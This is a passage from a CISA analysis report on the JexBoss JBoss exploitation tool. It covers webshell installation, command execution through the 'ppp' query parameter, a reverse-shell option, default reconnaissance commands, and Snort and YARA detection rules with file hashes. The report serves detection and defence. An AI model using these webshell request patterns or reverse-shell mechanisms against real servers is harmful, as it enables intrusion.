delivered as a URI query parameter in an HTTP HEAD request, exploiting a vulnerability in the JMX Console (a component of JBoss AS). If this exploit is successful, the victim web server will install the JexBoss webshell.\n \n\n\n\n![]()\n\n\n\n\n**Figure 11: Example of JexBoss webshell in URI query parameter** \n\n\n\n\n The packet dump shown in figure 12 is an example of the JexBoss webshell weaponized as a Java serialized object delivered to the JMX Invoker Servlet\u2014another component of JBoss AS\u2014in an\n `HTTP POST` \n request. The serialized object in this example (figure 11\\) begins with the bytes\n `\\xAC\\xED` \n at byte position\n `0x01c4` \n \u2014452 bytes into the HTTP request.\n \n\n\n\n![]()\n\n\n\n\n**Figure 12: Example of JexBoss webshell packaged in a Java serialized object** \n\n\n\n\n To test whether the installation of the webshell has succeeded, JexBoss will submit an\n `HTTP GET` \n request to the target web server for one of the following URLs:\n \n\n\n* `hxxp[:]//victim/jexws4/jexws4.jsp` \n , or\n* `hxxp[:]//victim/jexinv4/jexinv4.jsp` \n .\n\n\n\n Packet number 22 in figure 13 indicates the test for successful webshell installation. Packet number 24, the HTTP response to packet number 22, is an\n `HTTP 200 OK` \n message that indicates the webshell installation was successful. An\n `HTTP 404 Not Found` \n message in response indicates that the webshell installation failed.\n \n\n\n\n![]()\n\n\n\n\n**Figure 13: JexBoss webshell access packet list** \n\n\n\n###### Phase 3: C2 and Actions on Objectives\n\n\n\n If JexBoss succeeds in installing the JexBoss webshell on the victim web server, the webshell will allow the attacker to issue OS commands for execution through\n `HTTP GET` \n requests as follows:\n \n\n\n\n`hxxp[:]//victim/jexws4/jexws4.jsp?ppp=<url-encoded-OS-command>` \n\n\n\n\n For example, the packet contents displayed in figure 14 show that the attacker issued the id OS command to the webshell. In figure 14, the victim web server provided the OS command execution output in the HTTP response.\n \n\n\n\n![]()\n\n\n\n\n**Figure 14: JexBoss webshell command HTTP contents** \n\n\n\n\n When JexBoss is run in standalone mode, JexBoss will issue three specific commands\u2014after the successful installation of the webshell\u2014sequentially upon initial exploitation of a Linux server. These commands are listed in table 2\\.\n \n\n\n\n\n\n\n**Table 2: JexBoss' default initial Linux commands** \n\n\n\n\n| **Command** | **Description of Action** |\n| --- | --- |\n| uname \\-a | Retrieves host information |\n| cat /etc/issue | Retrieves Linux OS information |\n| id | Determines the user under which commands will run |\n\n\n\n Security analysts can observe the attempted execution of these three commands in web server logs, even if the HTTP communication is encrypted with Transport Layer Security or Secure Sockets Layer. Analyzing web server logs for this activity is an additional way organizations can confirm the presence of JexBoss.\n \n\n\n\n For vulnerabilities exploited through blind command injection, there is no installation step. JexBoss achieves the Cyber Kill Chain steps C2 and Actions on Objectives (i.e., Phase 3 in the Attack Phases section) by packaging OS commands directly in the exploit payload and delivering the payload to the vulnerable component; therefore, there is no distinction between Phase 2 and Phase 3 in blind command injection.\n \n\n\n\n The partial packet hexdump shown in figure 15 is an example of the C2 step with blind command injection. In this example, JexBoss packages and delivers an OS command that attempts to establish a reverse shell, described in the Reverse Shell section.\n \n\n\n\n![]()\n\n\n\n\n**Figure 15: KexBoss packet hexdump including reverse shell OS command** \n\n\n\n\n While a reverse webshell can help attackers achieve C2, it is also easy to detect. An organization\u2019s network web servers do not typically make outbound connections to arbitrary internet hosts; therefore, connections like these would be a red flag for network defenders. In the network capture shown in figure 16, the victim server has established a connection back to the attacker\u2019s system via TCP port 4444\\.\n \n\n\n\n![]()\n\n\n\n\n**Figure 16: JexBoss reverse webshell establishment packet list** \n\n\n\n\n An unusual outbound connection\u2014like the one illustrated in figure 16\u2014would stand out to an experienced network defender; the network defender\u2019s awareness of the anomalous behavior increases the attacker\u2019s risk of detection. Many organizations choose to filter outbound connections, which would stop an attempt like the one illustrated in figure 16\\.\n \n\n\n\n Attackers can execute JexBoss commands without a webshell or reverse webshell by using the\n `--cmd` \n option, as described in the Blind Command Injection section. A clever attacker could issue commands to perform complex tasks and exfiltrate data. For example, the attacker may create a script that collects data and sends it to another location on the victim network for later retrieval.\n \n\n\n##### Webshell Analysis\n\n\n\n If the JexBoss webshell is installed on the victim web server, JexBoss can access the webshell by issuing\n `HTTP GET` \n requests to the appropriate\n `.jsp` \n file (e.g.,\n `jexws4/jexws4.jsp` \n ), using the optional\n `ppp` \n query parameter, the value of which is used as the OS command to execute on the victim web server.\n \n\n\n\n  \n\n There are three main versions of the JexBoss webshell: the original version (November 30, 2014\\), version 2 (April 23, 2016\\), and version 4 (the current version). Each time a subsequent JexBoss version is created, the new version can be considered an upgrade over the previous version and offering additional capabilities, as described in table 3\\.\n \n\n\n\n\n\n\n**Table 3: JexBoss webshell functionality by version** \n\n\n\n\n| **Webshell Version** | **Functionality** |\n| --- | --- |\n| Original (November 30, 2014\\) | * Executes OS commands specified in the  `ppp`   HTTP query parameter using Java\u2019s  `Runtime.exec()`   method and returns the output of the command execution in the HTTP response * Requires the  `User-Agent: jexboss`   HTTP header |\n| Version 2 (April 23, 2016\\) | * Checks the webshell version if the check\\-updates HTTP header value is not set to false (see the Version Checks section) * Does not require the  `User-Agent: jexboss`   HTTP header * Executes OS command using Java\u2019s  `Runtime.exec()`   method \t+ Uses \t `cmd.exe /C`  \t for Windows OSs \t+ Uses \t `/bin/bash -c`  \t for non\\-Windows OSs |\n| Version 4 (Current) | * If the ppp HTTP query parameter is not specified, checks for the  `X-JEX`   HTTP header and, if present, uses the value of that header as the OS command * If the OS command is in the format  `jexremote=IP:PORT`   , establishes a reverse shell (using  `cmd.exe`   or  `/bin/bash`   , depending upon the web server OS) with the specified IP address and port using Java\u2019s Socket class |\n\n\n\n JexBoss webshell version 2 is the latest version available on GitHub, as described in the Version Checks section. This version check uses a User\\-Agent HTTP header value that includes information about the attacker\u2019s webshell access: the host HTTP header value and the IP address of the attacker host. This collection of host and IP information indicates that JexBoss\u2019 author may leverage attackers\u2019 use of the tool to collect a list of attacking IPs and exploited servers.\n \n\n\n\n The latest version of the webshell available on\n `joaomatosf[.]com` \n is version 4\\. At the time of this report\u2019s publication, NCCIC has been unable to acquire version 3 for analysis.\n \n\n\n\n### Summary\n\n\n\n\n JBoss Verify and EXploitation tool (JexBoss) is an open\\-source tool used by cybersecurity hunt teams (sometimes referred to as \u201cred teams\u201d) and auditors to conduct authorized security assessments. Threat actors use this tool maliciously to test and exploit vulnerabilities in JBoss Application Server (JBoss AS)\u2014now WildFly\u2014and a variety of Java applications and platforms. JexBoss automates all the phases of a cyberattack, making it a powerful and easy\\-to\\-use weapon in a threat actor\u2019s cyber arsenal.\n \n\n\n\n This report provides a detailed analysis of JexBoss\u2019 functionality, along with detection, response, prevention, and mitigation recommendations.\n \n\n\n\n### Solution\n\n\n\n\n NCCIC recommends a defense\\-in\\-depth approach to mitigating the risks of JexBoss.\n \n\n\n#### Best Practices\n\n\n\n The best way to defend against JexBoss is to ensure that servers are not vulnerable to the exploits it uses. The vulnerabilities exploited by JexBoss can also be exploited by other tools. Once an organization has remediated the vulnerabilities associated with JexBoss, the organization\u2019s servers will be less prone to other tools that leverage the same exploits.\n \n\n\n\n Best practices include\n \n\n\n* Keeping OSs, web servers, and applications up\\-to\\-date;\n* Securing access to administrative consoles;\n* Using non\\-privileged accounts with limited capabilities to run servers;\n* Reviewing server logs to identify indications of a successful compromise; and\n* Frequently testing organization systems and applications for the latest vulnerabilities via automated vulnerability scans.\n\n\n\n Because JBoss AS is no longer supported by the vendor, organizations using JBoss AS should migrate their existing JBoss AS instances to the supported equivalent, such as WildFly or the JBoss Enterprise Application Platform. Because JexBoss can be used to exploit a variety of other Java\\-based frameworks (e.g., Apache Struts, Java Server Faces, Jenkins), users should keep these frameworks updated, or remove them if they are not necessary.\n \n\n\n#### Detection Strategies\n\n\n\n An organization\u2019s security operations team can monitor for attempted and successful JexBoss exploit attacks using a variety of methods. NCCIC recommends the following detection strategies:\n \n\n\n* Update network IDS and IPS signatures.\n* Analyze behavioral indicators.\n* Analyze on\\-server artifacts.\n\n\n##### Network IDS and IPS Signatures\n\n\n\n Many organizations deploy Snort or Suricata IDSs in commercial appliances\u2014or as standalone platforms on commodity hardware\u2014and leverage signatures written by Snort, Emerging Threats, and others in the cybersecurity community. Tables 4 and 5 provide signatures developed by NCCIC and other organizations. Signatures that were created by outside organizations reference the appropriate signature identifier.\n \n\n\n\n NCCIC assesses the Snort rules in table 4 to be high\\-confidence indicators of potentially dangerous JexBoss webshell network behavior.\n \n\n\n\n\n\n\n**Table 4: JexBoss webshell Snort signatures/rules** \n\n\n\n\n| \\# | **JexBoss Behavior** | **Detection Signature/Rule** |\n| --- | --- | --- |\n| 1 | Attempts to issue a command to the JexBoss webshell with the  `ppp`   query parameter | alert tcp $EXTERNAL\\_NET any \\-\\> $HTTP\\_SERVERS any (msg:\"JexBoss webshell command ppp submission\"; flow:established,to\\_server; content:\".jsp?ppp\\=\"; http\\_uri; fast\\_pattern:only; classtype:trojan\\-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;) |\n| 2 | Attempts to issue a command to the JexBoss webshell with the  `X-JEX`   HTTP header field | alert tcp $EXTERNAL\\_NET any \\-\\> $HTTP\\_SERVERS any (msg:\"JexBoss webshell command X\\-JEX submission\"; flow:established,to\\_server; content:\"X\\-JEX\"; http\\_header; fast\\_pattern:only; classtype:trojan\\-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;) |\n| 3 | Attempts by the successfully exploited server to download the JexBoss webshell from the internet | alert tcp $HOME\\_NET any \\-\\> $EXTERNAL\\_NET any (msg:\"JexBoss webshell download\"; flow:established,to\\_server; content:\"rnp/jexws4\\.war\"; http\\_uri; fast\\_pattern:only; classtype:trojan\\-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;) |\n| 4 | CDNS queries for the JexBoss webshell version check and alternate download location | alert udp $HOME\\_NET any \\-\\> any 53 (msg:\"DNS query for JexBoss alternate domain\"; flow:to\\_server; byte\\_test:1,!\\&,0xF8,2; content:\"\\|08\\|webshell\\|07\\|jexboss\\|03\\|net\\|00\\|\"; fast\\_pattern:only; classtype:trojan\\-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;) |\n\n\n\n When run against real\\-world network traffic, NCCIC generated alerts for rule 1 in table 4 above. The URI pattern for these alerts was\n `/jexinv4/jexinv4.jsp?ppp=<cmd>` \n , where\n `<cmd>` \n was a long Linux command that tried to induce the server to download and execute a Linux webshell script from an internet location. This attempt to access the JexBoss webshell was one of several unrelated\n `HTTP` \n requests from the same source IP to the same target IP, likely indicating scanning activity to determine if the server was already compromised by any of a number of tools, including JexBoss.\n \n\n\n\n As noted in the Attacker to Victim Network Behavior section, an\n `HTTP 200 OK` \n message response from the server would indicate that the webshell was installed on the server. However, the response observed in the NCCIC environment was an\n `HTTP 302 Redirect` \n message, which instructed the client to repeat the request of\n `HTTPS` \n . NCCIC did not observe any such HTTPS traffic. Most likely the presumed scanning tool used to generate the HTTP traffic was not able to properly handle the\n `HTTP 302` \n response.\n \n\n\n\n Table 5 provides the Snort rules that indicate JexBoss activity but do not necessarily indicate successful JexBoss exploitation. Rule 5 in table 5 below, alerts on traffic to the JexBoss author\u2019s domain, which\u2014in addition to JexBoss webshells\u2014contains non\\-JexBoss content.\n \n\n\n\n\n\n\n**Table 5: Snort signatures identifying JexBoss attempts** \n\n\n\n\n| **\\#** | **Network Activity** | **Detection Signature** |\n| --- | --- | --- |\n| 1 | DNS queries for the JexBoss author\u2019s domain | alert udp $HOME\\_NET any \\-\\> any 53 (msg:\"DNS query for JexBoss author domain joaomatosf.com\"; flow:to\\_server; byte\\_test:1,!\\&,0xF8,2; content:\"\\|0A\\|joaomatosf\\|03\\|com\\|00\\|\"; fast\\_pattern:only; classtype:trojan\\-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;) |\n| 2 | Detects the JexBoss\\-specific probe of the Apache Struts 2 vulnerability (CVE\\-2017\\-5638\\) | alert tcp $EXTERNAL\\_NET any \\-\\> $HTTP\\_SERVERS any (msg: \"JexBoss Apache Struts 2 Probe or exploit\"; flow:established,to\\_server; content: \"GET\"; http\\_method; content: \"(\\#giftarray\\=(\\#isnix?{'/bin/bash','\\-c',\\#gift}:{'cmd.exe','/c',\\#gift}))\"; fast\\_pattern; classtype:trojan\\-activity; reference:url,github.com/joaomatosf/jexboss; sid: X; rev:1;) |\n| 3 | The HTTP User\\-Agent header value specific to JexBoss (for the deprecated version 1 of the webshell) | alert tcp $EXTERNAL\\_NET any \\-\\> $HTTP\\_SERVERS any (msg:\" JexBoss User\\-Agent\"; flow:established,to\\_server; content: \u201cGET\u201d; http\\_method; content:\"jexboss\"; http\\_user\\_agent; fast\\_pattern:only; classtype:trojan\\-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;) |\n\n\n##### Behavior Analysis of Network Activity\n\n\n\n The Snort signatures described in the Network IDS and IPS Signatures section may allow organizations to detect some JexBoss attacks. However, attackers attempting to use stealthier techniques may be able to tune their attacks to avoid detection from these signatures.\n \n\n\n\n By analyzing the behavior surrounding the attack, either manually or by using automated tools, network defenders may be able to determine whether an attack has succeeded. NCCIC\u2019s recommended analysis methods include searching for the following:\n \n\n\n* **Unusual outbound connection attempts from the server** \n\t+ Unusual outbound connection attempts may indicate an attacker attempting to initiate a reverse webshell or exfiltrate data.\n* **Unusual internet downloads from the server** \n\t+ Unusual internet downloads may indicate that an attacker is attempting to obtain tools to perform additional attacks (e.g., Mimikatz, SQLMap).\n* **Unusual URIs being served by the webserver** \n\t+ The presence of unusual URIs may indicate the installation of a webshell, as is the case when\n\t `jexws4/jexws4.jsp` \n\t is used.\n* **Embedded OS commands** \n\t+ Network defenders should specifically search for OS commands embedded in HTTP query parameters, HTTP header values, and\n\t `HTTP POST` \n\t data in the contents of the organization\u2019s network traffic. For example, the command in the Apache Struts 2 exploit is visible in the cleartext in the Content\\-Type header. NCCIC recommends organizations analyze their server to identify evidence that OS commands like these have been executed, the presence of which indicates a successful attack.\n\n\n\n Combining the automated analysis of signatures and behavioral indicators may significantly improve false\\-positive rates and time\\-to\\-detection.\n \n\n\n##### On\\-Server Artifacts\n\n\n\n The JexBoss webshell files included on the JexBoss GitHub page\u2014and available on the\n `joaomatosf[.]com` \n website\u2014are Web Application aRchive (WAR) format files, with the file extension\n `.war` \n . These WAR files are basically ZIP files containing the file\n `jexws.jsp` \n , which is the file in the URI that JexBoss requests in order to perform command execution. The JexBoss webshell\n `.war` \n and\n `.jsp` \n file names may start with\n `jexsw2` \n ,\n `jexws3` \n ,\n `jexws4` \n , or\n `jbossass` \n .\n \n\n\n\n Tables 6, 7, and 8 include filenames and their associated MD5 checksums for the files related to the JexBoss webshell. Network defenders should search for these files on their organization\u2019s web server file systems, the presence of which indicates a JexBoss webshell.\n \n\n\n\n The webshell files provided on the JexBoss GitHub page are identified in table 6\\.\n \n\n\n\n\n\n\n**Table 6: JexBoss webshells on GitHub** \n\n\n\n\n| **Filename** | **Webshell Version** | **Size (bytes)** | **MD5 Checksum** |\n| --- | --- | --- | --- |\n| jbossass.war | 1 | 685 | cbdeaf83f58a64b09df58b94063e0146 |\n| jexws.war and jbossas.war | 2 | 1296 | 3f156bd68b2a32a1b5cb03af318667f0 |\n\n\n\n If the target web server is induced to download the\n `.war` \n file from\n `joaomatosf[.]com` \n (see the Webshell Installation section), the web server will retrieve the latest version of the webshell (currently version 4\\). NCCIC\u2019s examination of the public files hosted on\n `joaomatosf[.]com` \n revealed the presence of the\n `.war` \n files listed in table 7\\.\n \n\n\n\n\n\n\n**Table 7: JexBoss webshells listed on\n `joaomatosf[.]com`**\n\n\n\n\n| **Filename** | **Webshell Version** | **Size (bytes)** | **MD5 Checksum** |\n| --- | --- | --- | --- |\n| jbossass.war | 4 | 1452 | 8db88d5d46aa503a697a6940aa10a574 |\n| jexws.war | 4 | 1446 | bb8d176207045ff70470c511271f56d9 |\n| jexws2\\.war | 4 | 1448 | 13062a85ed1f5c3f4878ff3950a8e222 |\n| jexws3\\.war | 4 | 1448 | f2af83ed4cac1d2c68f82bd8450c7428 |\n| jexws4\\.war | 4 | 1448 | a15bf7dd4169069c70ba2f4ee1c62b03 |\n\n\n\n The\n `.jsp` \n files within the\n `.war` \n files in tables 6 and 7 are listed in table 8\\.\n \n\n\n\n\n\n\n**Table 8: JexBoss\n `.jsp` \n files** \n\n\n\n\n| **Filename** | **Webshell Version** | **Size (bytes)** | **MD5 Checksum** |\n| --- | --- | --- | --- |\n| jbossass.jsp | 1 | 378 | 3cd75a261debd9fb2b16368266fba778 |\n| jexws.jsp | 2 | 1812 | e7d94e998f1ec8beb8f33e56607c45f9 |\n| jexws.jsp | 4 | 2201 | acda46759d7c3526df2a6c59803586a4 |\n\n\n\n Once the\n `.war` \n file is successfully uploaded to the victim web server, JBoss handles the file as if it is a legitimate web application. In the test environment, NCCIC found the original\n `.war` \n and the unzipped\n `.jsp` \n files in a temporary location (\n `/opt/jboss-6.1.0.Final/server/default/tmp` \n ), while the contents of the\n `.jsp` \n file were wrapped in a platform\\-specific class and written to a new file. The contents of the\n `.jsp` \n file were then installed by JBoss in the following location:\n \n\n\n\n`/opt/jboss-6.1.0.Final/server/default/work/jboss.web/localhost/jexws4/org/apache/jsp/jexws4_jsp.java` \n\n\n\n\n Advanced users of JexBoss can change the names of the webshell files, make minor modifications so that the MD5 checksum differs from those listed in this report, or completely change this webshell to circumvent the methods of detection that focus on the presence of the specific files listed in this report. However, network defenders may still benefit from frequently reviewing web servers for the presence of unwanted files and URIs served by their web server, which may indicate the presence of a webshell or other malware.\n \n\n\n\n Network defenders should carefully examine their organization\u2019s web server logs for indications of malicious web requests, specifically to identify requests that contain OS commands, such as\n \n\n\n* `/bin/bash` \n or\n `uname -a` \n in Linux, or\n* `cmd.exe` \n or\n `net` \n commands in Windows.\n\n\n\n Forensic analysts can use the YARA rules provided in figure 17 to search their web server file system for the presence of JexBoss webshell files. These general YARA rules may work better than file hashes to alert on webshell files that attackers have made small changes to in order to evade detection. These general YARA rules will not detect other custom webshells or heavily modified JexBoss webshells.\n \n\n\n\n rule jexboss\\_war: webshell\n   \n\n {\n   \n\n meta:\n   \n\n description \\= \"JexBoss WAR File\"\n   \n\n strings:\n   \n\n $magic \\= { 50 4b 03 04 ( 14 \\| 0a ) 00 }\n   \n\n $string\\_1 \\= \"jexws\"\n   \n\n $string\\_2 \\= \"jbossass\"\n   \n\n $jsp\\_ext \\= \".jsp\"\n \n\n condition:\n   \n\n $magic at 0 and 1 of ($string\\_\\*) and $jsp\\_ext\n   \n\n }\n \n\n rule jexboss\\_jsp: webshell\n   \n\n {\n   \n\n meta:\n   \n\n description \\= \"JexBoss JSP file\"\n   \n\n strings:\n   \n\n $string\\_1 \\= \"getParameter(\\\\\"ppp\\\\\")\"\n   \n\n $string\\_2 \\= \"jexboss\" nocase\n   \n\n $string\\_3 \\= \"getRuntime().exec(\"\n   \n\n condition:\n   \n\n all of ($string\\_\\*)\n   \n\n }\n \n\n**Figure 17: JexBoss webshell YARA rules** \n\n\n\n\n### References\n\n\n\n\n[\\[1] Cisco Talos Intelligence Blog post on SamSam](https://blog.talosintelligence.com/2016/03/samsam-ransomware.html) \n\n\n[\\[2] Symantec Internet Security Threat Report](https://www.symantec.com/content/dam/symantec/docs/reports/istr-22-2017-en.pdf) \n\n\n[\\[3] Exploit Database article on Apache Struts 2 exploit](https://www.exploit-db.com/exploits/41570/) \n\n\n### Revisions\n\n\n\n\n November 8, 2018: Initial version\n \n\n\n\n\n\n\n\n\n\n\n This product is provided subject to this\n [Notification](/notification \"Follow link\") \n and this\n [Privacy \\& Use](/privacy-policy \"Follow link\") \n policy.\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPlease share your thoughts\n--------------------------\n\n\n\n We recently updated our anonymous\n [product survey](https://www.surveymonkey.com/r/CISA-cyber-survey?product=https://www.cisa.gov/news-events/analysis-reports/ar18-312a) \n ; we\u2019d welcome your feedback.\n \n\n\n\n\n\n\n\n\n\n\n\n\nRelated Advisories\n------------------\n\n\n\n\n\n\n\n\n\n\n Feb 07, 2024\n \n\n\n Analysis Report \\| AR24\\-038A\n \n\n### [MAR\\-10448362\\-1\\.v1 Volt Typhoon](/news-events/analysis-reports/ar24-038a)\n\n\n\n\n\n\n\n\n\n\n\n Nov 21, 2023\n \n\n\n Analysis Report \\| AR23\\-325A\n \n\n### [MAR\\-10478915\\-1\\.v1 Citrix Bleed](/news-events/analysis-reports/ar23-325a)\n\n\n\n\n\n\n\n\n\n\n\n Sep 07, 2023\n \n\n\n Analysis Report \\| AR23\\-250A\n \n\n### [MAR\\-10430311\\-1\\.v1 Multiple Nation\\-State Threat Actors Exploit CVE\\-2022\\-47966 and CVE\\-2022\\-42475](/news-events/analysis-reports/ar23-250a)\n\n\n\n\n\n\n\n\n\n\n\n Sep 07, 2023\n \n\n\n Analysis Report \\| AR23\\-250A\n \n\n### [MAR\\-10454006\\.r5\\.v1 SUBMARINE, SKIPJACK, SEASPRAY, WHIRLPOOL, and SALTWATER Backdoors](/news-events/analysis-reports/ar23-250a-0)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Return to top](#) \n\n\n\n\n* [Topics](/topics)\n* [Spotlight](/spotlight)\n* [Resources \\& Tools](/resources-tools)\n* [News \\& Events](/news-events)\n* [Careers](/careers)\n* [About](/about)\n\n\n\n\n\n\n\n\n[Cybersecurity \\& Infrastructure Security Agency](/ \"Go to the Cybersecurity & Infrastructure Security Agency homepage\")\n\n\n* [Facebook](https://www.facebook.com/CISA)\n* [Twitter](https://twitter.com/CISAgov)\n* [LinkedIn](https://www.linkedin.com/company/cybersecurity-and-infrastructure-security-agency)\n* [YouTube](https://www.youtube.com/@cisagov)\n* [Instagram](https://www.instagram.com/cisagov)\n* [RSS](/subscribe-updates-cisa)\n\n\n\n\n CISA Central\n \n[1\\-844\\-Say\\-CISA](tel:1-844-Say-CISA) \n[SayCISA@cisa.gov](mailto:SayCISA@cisa.gov) \n\n\n\n\n\n\n\n\n\n\n\n DHS Seal\n \n\n\n CISA.gov\n \n\n An official website of the U.S. Department of Homeland Security\n \n\n\n* [About CISA](/about \"About CISA\")\n* [Budget and Performance](https://www.dhs.gov/performance-financial-reports \"Budget and Performance\")\n* [DHS.gov](https://www.dhs.gov \"Department of Homeland Security\")\n* [Equal Opportunity \\& Accessibility](/oedia \"Equal Opportunity & Accessibility\")\n* [FOIA Requests](https://www.dhs.gov/foia \"FOIA Requests\")\n* [No FEAR Act](/no-fear-act \"No FEAR Act Reporting\")\n* [Office of Inspector General](https://www.oig.dhs.gov/ \"Office of Inspector General\")\n* [Privacy Policy](/privacy-policy \"Privacy Policy\")\n* [Subscribe](https://public.govdelivery.com/accounts/USDHSCISA/subscriber/new?topic_id=USDHSCISA_138 \"Subscribe to Email Updates\")\n* [The White House](https://www.whitehouse.gov/ \"The White House\")\n* [USA.gov](https://www.usa.gov/ \"USA.gov\")\n* [Website Feedback](/forms/feedback \"Website Feedback\")\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", "cves": ["CVE-2022-47966", "CVE-2017-5638", "CVE-2022-42475"], "techniques": [], "advisory": "ar18-312a", "title": "JexBoss \u2013 JBoss Verify and EXploitation Tool | CISA", "source": "analysis-reports", "id": "ab440c463f34e4e1d97e7daf5e10c55ff46498581cac31e323b88a04b6a001c5"}